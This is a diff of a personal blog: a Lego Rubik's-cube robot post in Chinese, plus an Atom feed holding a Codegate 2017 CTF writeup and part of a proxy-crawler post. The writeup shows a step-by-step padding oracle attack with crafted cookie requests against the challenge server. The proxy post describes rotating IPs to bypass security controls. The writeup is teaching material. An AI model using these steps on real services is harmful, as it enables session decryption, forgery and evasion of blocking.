@@ -1,356 +1,83 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[xelz's blog]]></title>
-  <link href="http://xelz.info/atom.xml" rel="self"/>
-  <link href="http://xelz.info/"/>
-  <updated>2017-02-20T18:34:01+00:00</updated>
-  <id>http://xelz.info/</id>
-  <author>
-    <name><![CDATA[xelz]]></name>
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>我的玩具——乐高魔方机器人 - xelz's blog</title>
+	<meta name="author" content="xelz">
+
+	
+	<meta name="description" content="没梯子请点优酷 0x00 简要说明 硬件环境：Lego NXT 8547, iPhone 4S(需越狱) 软件依赖：LeJOS, BTStack, OpenCV2 还原效率：扫描10~15秒，计算&lt;1秒，还原~1分钟 0x01 Lego &amp; Tilted Twister &hellip;">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="xelz's blog" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+    <script src="/javascripts/jquery.min.js"></script>
     
-  </author>
-  <generator uri="http://octopress.org/">Octopress</generator>
-
-  
-  <entry>
-    <title type="html"><![CDATA[Codegate 2017 2D Life writeup]]></title>
-    <link href="http://xelz.info/blog/2017/02/20/codegate-2017-2d-life-writeup/"/>
-    <updated>2017-02-20T20:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2017/02/20/codegate-2017-2d-life-writeup</id>
-    <content type="html"><![CDATA[<h3>Description</h3>
-
-<h4>2D Life</h4>
-
-<p>470 points</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://110.10.212.135:24135
-</span><span class='line'>http://110.10.212.135:24136
-</span><span class='line'>http://110.10.212.147:24135
-</span><span class='line'>http://110.10.212.147:24136</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I didn&rsquo;t have enough time to solve this challenge since I&rsquo;m busy at work. It&rsquo;s a pity that my team didn&rsquo;t, neither. But I have to say it&rsquo;s a very challenging one. Combination of crypto and SQL injection.</p>
-
-<h3>First Sight</h3>
-
-<p>It seemed to be a web challenge because the entrance was a website. So let&rsquo;s start with HTTP requests and responses. In the source code of the page, a path to secret login page was commented.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;navbar&quot;</span> <span class="na">class=</span><span class="s">&quot;navbar-collapse collapse&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">&quot;nav navbar-nav&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/&quot;</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;?p=pic&quot;</span><span class="nt">&gt;</span>Pictures<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;?p=music&quot;</span><span class="nt">&gt;</span>Music<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;?p=contact&quot;</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
-</span><span class='line'>  <span class="c">&lt;!--&lt;li&gt;&lt;a href=&quot;?p=secret_login&quot;&gt;Login&lt;/a&gt;&lt;li&gt;--&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;/ul&gt;</span>
-</span><span class='line'><span class="nt">&lt;/div&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The login page set a cookie like this(using <a href="https://httpie.org/">httpie</a>)</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>$ http http://110.10.212.135:24135/\?p\=secret_login
-</span><span class='line'>HTTP/1.1 200 OK
-</span><span class='line'>Connection: Keep-Alive
-</span><span class='line'>Content-Encoding: gzip
-</span><span class='line'>Content-Length: 579
-</span><span class='line'>Content-Type: text/html; charset=UTF-8
-</span><span class='line'>Date: Fri, 10 Feb 2017 05:57:50 GMT
-</span><span class='line'>Keep-Alive: timeout=5, max=100
-</span><span class='line'>Server: Apache/2.4.18 (Ubuntu)
-</span><span class='line'>Set-Cookie: identify=t93ZpEcFoz4%3D%7C6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb%2BBgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ%2Bw%3D%3D
-</span><span class='line'>Vary: Accept-Encoding
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It&rsquo;s easy to say that the cookie is two parts of base64 encoded string concatenated by a <code>|</code>.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>t93ZpEcFoz4=|6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb+BgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ+w==
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Different cookies was returned when repeating the same request. Modify the tail of the cookie will got a message <code>Error has occur from decrypt..</code>, but the head won&rsquo;t.</p>
-
-<!-- more -->
-
-
-<h3>Cryptography</h3>
-
-<p>Look at the two parts of cookie:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>part 1: t93ZpEcFoz4=
-</span><span class='line'>decode: b7 dd d9 a4 47 05 a3 3e
-</span><span class='line'>length: 8
-</span><span class='line'>
-</span><span class='line'>part 2: 6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb+BgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ+w==
-</span><span class='line'>decode: ea e0 c6 90 3e 55 b4 49 34 1f d9 00 3b 33 ab 40 40 83 cd 17 55 ba e0 d8 9f 88 7c 21 2a 16 49 4b 9e b4 7e 42 6f e0 60 49 fc 52 77 d5 9f 5f d4 71 1c 60 bb 72 70 19 76 79 b1 aa 77 99 ac b9 10 fb
-</span><span class='line'>length: 64
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now I believe it&rsquo;s a <code>Padding Oracle</code> Problem. I&rsquo;ve read about it in <em>Web Security by White Hats</em> (刺总的《白帽子讲Web安全》). <code>Part 1</code> is the 8 bytes <code>iv</code> of encryption, and <code>Part 2</code>, obviously is 8 blocks of encrypted data, with 8 bytes in each block.</p>
-
-<h4>CBC Mode</h4>
-
-<p>Every Block cipher can only deal with a message with fixed length (usually the same length as the key), so plain message is divided into several blocks and each block will be encrypted separately. To avoid data pattern sniffing, a vector is added befor encryption in CBC mode.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>             XOR
-</span><span class='line'>plain block ---&gt; |+| ---&gt; intermediate value ---&gt; encrypted block
-</span><span class='line'>              ^                           ^
-</span><span class='line'>            Vector                    encryption
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Vector of each plain data block is the encrypted data of previous block. The Initial Vector for the first data block is provided additionally.</p>
-
-<h4>PKCS#5 Padding</h4>
-
-<p>Length of every block must be exactly the same with the key. In this case, the length is 8 bytes. If there is less than 8 bytes(or just equal to 8 bytes) in the last block, a padding is introduced.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>xx xx xx xx xx xx xx    -&gt; xx xx xx xx xx xx xx 01
-</span><span class='line'>xx xx xx xx xx xx       -&gt; xx xx xx xx xx xx 02 02
-</span><span class='line'>xx xx xx xx xx          -&gt; xx xx xx xx xx 03 03 03
-</span><span class='line'>xx xx xx xx             -&gt; xx xx xx xx 04 04 04 04
-</span><span class='line'>xx xx xx                -&gt; xx xx xx 05 05 05 05 05
-</span><span class='line'>xx xx                   -&gt; xx xx 06 06 06 06 06 06
-</span><span class='line'>xx                      -&gt; xx 07 07 07 07 07 07 07
-</span><span class='line'>xx xx xx xx xx xx xx xx -&gt; xx xx xx xx xx xx xx xx
-</span><span class='line'>                           08 08 08 08 08 08 08 08
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>While decrypting, cipher will check the value of the last byte in the decrypted message. Assume that value is 0x04, then check the value of the last 4 bytes. It will be fine if they all equal to 0x04 and the 4 bytes will be directly removed to recover the original length of plain message. Otherwise a decryption exception occured as I tried above.</p>
-
-<h4>Padding Oracle Attack</h4>
-
-<p>We know a bad padding format of the last block will cause exception, so if we craft a fake data which can make the padding match the right format, the data will be accepted by the server without throwing a decryption exception(This does not means it will be completely accepted by server without any other excpetions because the data is totally a mess). At this moment we know the last few bytes in the decrypted message,  is one of the padding format.</p>
-
-<p>We&rsquo;ve got last bytes of plain block and the vector(we craft it), so we can get the last bytes of intermediate value of the corresponding encrypted block by</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>intermediate value  =  plain block with padding  (xor)  craft vector
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>and then, the real plain block</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>plain block = intermediate value  (xor)  actual vector
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To make it clear, we can brute force every byte in a block, from the last byte to the first one.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>|            iv: b7 dd d9 a4 47 05 a3 3e
-</span><span class='line'>|encrypted data: ea e0 c6 90 3e 55 b4 49
-</span><span class='line'>|                34 1f d9 00 3b 33 ab 40
-</span><span class='line'>|                40 83 cd 17 55 ba e0 d8
-</span><span class='line'>|                9f 88 7c 21 2a 16 49 4b
-</span><span class='line'>|                9e b4 7e 42 6f e0 60 49
-</span><span class='line'>|                fc 52 77 d5 9f 5f d4 71
-</span><span class='line'>|                1c 60 bb 72 70 19 76 79
-</span><span class='line'>|                b1 aa 77 99 ac b9 10 fb
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Start with the first block <code>ea e0 c6 90 3e 55 b4 49</code>, enumerate the last byte of iv, from 0x00 to 0xFF.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>|               iv : ff ff ff ff ff ff ff 00
-</span><span class='line'>|       iv encoded : /////////wA=
-</span><span class='line'>|encrypted message : ea e0 c6 90 3e 55 b4 49
-</span><span class='line'>|  message encoded : 6uDGkD5VtEk=
-</span><span class='line'>|           cookie : /////////wA=|6uDGkD5VtEk=
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>visit secure login page with the fake cookie:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>$ http &#39;110.10.212.135:24135/?p=secret_login&#39; cookie:&#39;identity=/////////wA=|6uDGkD5VtEk=&#39;
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>got the message <code>Error has occur from decrypt..</code></p>
-
-<p>continue trying with different iv(this can be done with a piece of script)</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>ff ff ff ff ff ff ff 01
-</span><span class='line'>ff ff ff ff ff ff ff 02
-</span><span class='line'>...
-</span><span class='line'>ff ff ff ff ff ff ff 1f
-</span><span class='line'>...
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>a different message showed up when trying <code>0x1f</code> as the last byte in iv.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>Is that all? HACKER?
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>BINGO!  It means the padding is 0x01 now(not quite), more clearly, the last byte of the plain message is 0x01.</p>
-
-<p>PS: If the second to last byte in the plain message just happen to be 0x02, then the last byte may be 0x02, too. Both 0x01 and 0x02 are valid at this situation. Just change the last 0xff in iv to any other value and try again, which will break the combination of  <code>0x02 0x02</code> padding (into <code>0x?? 0x02</code>). If nothing different with 0xff(no decrypt error occuring), 0x01 is the right answer.</p>
-
-<p>the last byte of intermediate value can be calculated by</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>intermediate value = iv   (xor)   plain message
-</span><span class='line'>        1e         = 1f    (+)         01
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>and then calculate the last byte of original plain message by the original iv</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>plain message = iv   (xor)   intermediate value
-</span><span class='line'>      20      = 3e    (+)           1e
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The last byte of the first plain block is <code>0x20</code>!</p>
-
-<p>Next byte, we need to make the plain message have a value of 0x02 in the last byte, to test the <code>0x02 0x02</code> padding. So last byte of iv must be <code>0x02 (+) 0x1e = 0x1c</code></p>
-
-<p>Trying like this</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>ff ff ff ff ff ff 00 1c
-</span><span class='line'>ff ff ff ff ff ff 01 1c
-</span><span class='line'>ff ff ff ff ff ff 02 1c
-</span><span class='line'>...
-</span><span class='line'>ff ff ff ff ff ff ff 1c
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>ff ff ff ff ff ff e4 1c</code> will make the sense.  <code>0xe4 (+) 0x02 (+) 0xa3 = 0x45</code></p>
-
-<p>Finally we can get the first block:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>|                iv : b7 dd d9 a4 47 05 a3 3e
-</span><span class='line'>|intermediate value : fa 98 8a f7 06 42 e6 1e
-</span><span class='line'>|     plain message : 4d 45 53 53 41 47 45 20
-</span><span class='line'>|        plain text : M  E  S  S  A  G  E
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Continue with the next block:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>34 1f d9 00 3b 33 ab 40
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Notice that the original vector of this block is the previous enctyped block <code>ea e0 c6 90 3e 55 b4 49</code>, not the iv.</p>
-
-<p>After all the entire message came out:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>MESSAGE FROM SPY<span class="c">&lt;!--TABLE:agents NUMBER OF COLUMNS:5--&gt;</span>;SPY;66
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h3>SQL Injection</h3>
-
-<p>We didn&rsquo;t got the flag but a hint</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>Table: agents
-</span><span class='line'>columns: 5
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It should be a SQL injection attack.</p>
-
-<p>I dinn&rsquo;t solve this until the server was shut down. TAT</p>
-
-<p><a href="http://crypto.rop.sh/post/71CBLOYIN034">Writeup by cnc</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[我的玩具——乐高魔方机器人]]></title>
-    <link href="http://xelz.info/blog/2017/02/18/lego-cube-solver/"/>
-    <updated>2017-02-18T20:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2017/02/18/lego-cube-solver</id>
-    <content type="html"><![CDATA[<iframe width="100%" height="450" src="https://www.youtube.com/embed/lXMsFn_69Dw" frameborder="0" allowfullscreen></iframe>
+</head>
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">xelz's blog</a></h1>
+<nav id="main-nav"><ul class="main">
+	<li><a href="/">Blog</a></li>
+	<li><a href="/blog/archives">Archives</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul class="main">
+	<li><a href="/">Blog</a></li>
+	<li><a href="/blog/archives">Archives</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:xelz.info">
+			</form>
+		</div>
+	</div>
+</nav>
+<nav id="sub-nav" class="alignright">
+	<div class="social">
+		
+		
+		
+		
+		<a class="github" href="https://github.com/xelzmm" title="GitHub">GitHub</a>
+		
+    
+		
+		
+		
+		
+		
+		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
+		
+    
+	</div>
+	<form class="search" action="https://www.google.com/search" method="get">
+		<input class="alignright" type="text" name="q" results="0">
+		<input type="hidden" name="q" value="site:xelz.info">
+	</form>
+</nav>
+
+</header>
+	
+		
+	
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">我的玩具——乐高魔方机器人</h2>
+	<div class="entry-content"><iframe width="100%" height="450" src="https://www.youtube.com/embed/lXMsFn_69Dw" frameborder="0" allowfullscreen></iframe>
 
 
 <p>没梯子请点<a href="http://player.youku.com/embed/XMjUyMDcxMDk1Mg==">优酷</a></p>
@@ -370,11 +97,11 @@
 
 <p>5年前心血来潮，为了做一个能自动拧魔方的机器人，买了一套乐高8547，按当时的收入算，简直是花了一笔巨款(默默心疼3秒)，之后就开始各种折腾。折腾了两天实在受不了那个中看不中用的GUI编程套件，直接刷了<a href="http://www.lejos.org">LeJOS</a>(Lego Java OS)，它提供了Java Runtime，可以愉快地使用Java进行coding。</p>
 
-<p><img src="http://xelz.info/assets/2017/lego-8547.jpg" alt="lego-8547" /></p>
+<p><img src="/assets/2017/lego-8547.jpg" alt="lego-8547" /></p>
 
 <p>先是抱Hans Andersson大神的大腿，开始拼<a href="http://tiltedtwister.com/download/tt2/TT2.pdf">Tilted Twister</a>，拼成之后发现完全无法顺利行╮(╯▽╰)╭。主要原因是颜色识别很不准，主要是魔方的<strong>橙色</strong>块和<strong>红色</strong>块，通过颜色传感器采集到的颜色值太相近了(采集到的颜色值是8bit，范围是0~255)，根本无法有效区分开，外界光线的亮一点或者暗一点都会严重影响识别正确率。并且因为乐高自身的CPU和内存都弱到爆炸，大约需要30s~60s才能计算出一个平均50步的解法，再花约3-5分钟进行还原，速度还没有我自己快。</p>
 
-<p><img src="http://xelz.info/assets/2017/tiltedtwister2.jpg" alt="lego-8547" /></p>
+<p><img src="/assets/2017/tiltedtwister2.jpg" alt="lego-8547" /></p>
 
 <p>后来冒出了个想法：何不使用手机摄像头扫描，然后在手机上计算还原步骤再控制机器人还原？这样不仅可以一次性扫描9个色块，也可以利用手机强大的CPU在更短的时间内计算出步骤更少的解法，同时提高准确率与运行效率。</p>
 
@@ -384,7 +111,7 @@
 
 <p>机器人有两个Motor，以LEGO的前脸为正面视角：</p>
 
-<p><img src="http://xelz.info/assets/2017/lego-axis.png" alt="axis" /></p>
+<p><img src="/assets/2017/lego-axis.png" alt="axis" /></p>
 
 <ul>
 <li>机械臂往前<code>推(PUSH)</code>，可以让魔方绕X轴逆时针旋转90°，实现上、前、下、后四个面之间的翻转</li>
@@ -773,7 +500,7 @@
 
 <p>大概长成这个样子：</p>
 
-<p><img src="http://xelz.info/assets/2017/grid.png" alt="grid" /></p>
+<p><img src="/assets/2017/grid.png" alt="grid" /></p>
 
 <p>手动将魔方与九宫格参考线对齐之后，点击屏幕任意位置开始取色。取色的时候需要取中心区域的多个点，然后计算平均色值，避免单个点的色值误差太大。这里遇到一个问题是Android摄像头的预览图像数据是YUV色彩空间，而不是RGB，需要先进行一次转换:</p>
 
@@ -983,11 +710,11 @@
 </ol>
 
 
-<p><img src="http://xelz.info/assets/2017/woqu.png" alt="woqu" /></p>
+<p><img src="/assets/2017/woqu.png" alt="woqu" /></p>
 
 <p>如此繁琐，颜色识别的准确率又不美丽，我不禁开始思考人生。。。</p>
 
-<p><img src="http://xelz.info/assets/2017/thinking.png" alt="thinking" /></p>
+<p><img src="/assets/2017/thinking.png" alt="thinking" /></p>
 
 <p>期间考虑过换用iOS设备，但是iOS设备的蓝牙不支持RFCOMM通讯协议，也就作罢。</p>
 
@@ -1182,11 +909,11 @@
 
 <p>深夜3点，测试一下RFCOMM通信</p>
 
-<p><img src="http://xelz.info/assets/2017/bluetooth.jpg" alt="bluetooth" /></p>
+<p><img src="/assets/2017/bluetooth.jpg" alt="bluetooth" /></p>
 
 <p>真是一把辛酸泪。。。</p>
 
-<p><img src="http://xelz.info/assets/2017/cry.png" alt="cry" /></p>
+<p><img src="/assets/2017/cry.png" alt="cry" /></p>
 
 <h3>扫描部分</h3>
 
@@ -1201,7 +928,7 @@
 
 <p>怎么检测直线呢？经过一番Google，找到了基于iOS开源图像处理框架GPUImage的一种算法。事实证明，我还是too young, too naive：</p>
 
-<p><img src="http://xelz.info/assets/2017/detect1.png" alt="detect1" /></p>
+<p><img src="/assets/2017/detect1.png" alt="detect1" /></p>
 
 <p>不管如何调整检测参数，直线的数量都超乎我的想象，更何况，我根本想不出一种算法去判断他们是不是能组成九宫格的图案。。。</p>
 
@@ -1212,7 +939,7 @@
 </ul>
 
 
-<p><img src="http://xelz.info/assets/2017/detect2.png" alt="detect2" /></p>
+<p><img src="/assets/2017/detect2.png" alt="detect2" /></p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -1387,7 +1114,7 @@
 
 <p>是不是很机智！当然，这个算法也会有傻逼的时候：</p>
 
-<p><img src="http://xelz.info/assets/2017/detect3.png" alt="detect3" /></p>
+<p><img src="/assets/2017/detect3.png" alt="detect3" /></p>
 
 <p>解决类似的问题需要再检测一下每个正方形之间的间距。不过，如果放在魔方机器人的底座上进行扫描，周围应该没有什么干扰项，多增加一部分计算的代码反而会影响画面的刷新率，也就无所谓了。</p>
 
@@ -1500,7 +1227,7 @@
 
 <p>将这三部分整合起来，就是文章最开始的那个视频的样子，历经千辛万苦，终于实现了最初设计的那套方案。</p>
 
-<p><img src="http://xelz.info/assets/2017/xuebi.jpg" alt="xuebi" /></p>
+<p><img src="/assets/2017/xuebi.jpg" alt="xuebi" /></p>
 
 <h2>0x05 膜拜一下大神们</h2>
 
@@ -1514,1387 +1241,102 @@
 <li><p>开源魔方机器人，<a href="http://mindcuber.com/index.html">MindCuber</a>，作者正是Cube Stormer 3的作者之一<code>David Gilday</code></p></li>
 </ol>
 
-]]></content>
-  </entry>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
   
-  <entry>
-    <title type="html"><![CDATA[Proxy Server Crawler]]></title>
-    <link href="http://xelz.info/blog/2017/02/03/proxy-server-crawler/"/>
-    <updated>2017-02-03T10:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2017/02/03/proxy-server-crawler</id>
-    <content type="html"><![CDATA[<p>When we are doing security tests, we always change our IP address to bypass some security strategies. The easiest way to change IP is using a proxy.</p>
 
-<p>Some websites can provide proxy IPs, but none of them can ensure the healthy of those proxy hosts. It&rsquo;s a horrible thing to check them one by one by hand when you wanna got one. So we can crawl these websites and test every proxy IP automatically.</p>
 
-<p>The project is hosted at <a href="https://github.com/xelzmm/proxy_server_crawler">https://github.com/xelzmm/proxy_server_crawler</a>.</p>
+<time datetime="2017-02-18T20:00:00+00:00" pubdate data-updated="true">2017-02-18</time></div>
+    
 
-<h2>Introduction</h2>
+<div class="tags">
 
-<p><strong>Proxy Server Crawler</strong> is a tool used to crawl public proxy servers from proxy websites. When crawled a proxy server(ip::port::type), it will test the functionality of the server automatically.</p>
+	<a class='category' href='/blog/categories/cube/'>cube</a>, <a class='category' href='/blog/categories/lego/'>lego</a>, <a class='category' href='/blog/categories/nxt/'>nxt</a>
 
-<p>Currently supported websites:</p>
+</div>
 
-<ul>
-<li><a href="http://www.66ip.cn">http://www.66ip.cn</a></li>
-<li><a href="http://www.cz88.net">http://www.cz88.net</a></li>
-<li><a href="http://www.cn-proxy.com">http://www.cn-proxy.com</a></li>
-<li><a href="http://www.haodailiip.com">http://www.haodailiip.com</a></li>
-<li><a href="http://www.kuaidaili.com">http://www.kuaidaili.com</a></li>
-<li><a href="http://www.proxylists.net">http://www.proxylists.net</a></li>
-<li><a href="http://www.qiaodm.net">http://www.qiaodm.net</a></li>
-<li><a href="http://www.socks-proxy.net">http://www.socks-proxy.net</a></li>
-<li><a href="http://www.xroxy.com">http://www.xroxy.com</a></li>
-<li><a href="http://www.xicidaili.com">http://www.xicidaili.com</a></li>
-</ul>
 
+    
+        
+            
+    <div class="comments"><a href="#disqus_thread">Comments</a></div>
+            
+        
+    
+</div>
+</article>
 
-<p>Currently supported testing(for http proxy)</p>
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+		
+		
+		<a class="addthis_button_tweet"></a>
+		
+		
+		
+	</div>
+	
+</div>
 
-<ul>
-<li>ssl support</li>
-<li>post support</li>
-<li>speed (tested with 10 frequently used sites)</li>
-<li>type(high/anonymous/transparent)</li>
-</ul>
 
 
-<!-- more -->
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
 
+    xelz
 
